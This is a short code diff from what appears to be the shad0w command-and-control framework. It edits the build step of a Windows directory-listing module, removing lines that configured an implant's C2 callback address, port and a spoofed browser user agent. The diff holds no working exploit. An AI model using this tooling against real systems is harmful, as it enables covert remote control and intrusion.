@@ -89,11 +89,7 @@ ls "C:\\Documents and Settings"
     buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/ls/", builddir="/root/shad0w/modules/windows/ls/build")
 
     # set the correct settings
-    template = """#define _C2_CALLBACK_ADDRESS L"%s"
-#define _C2_CALLBACK_PORT %s
-#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
-LPCSTR szDir = "%s\\\\*";
-""" % (shad0w.addr[0], shad0w.addr[1], dir)
+    template = "LPCSTR szDir = \"%s\\\\*\";" % (dir)
 
     buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/ls/build/settings.h")
 
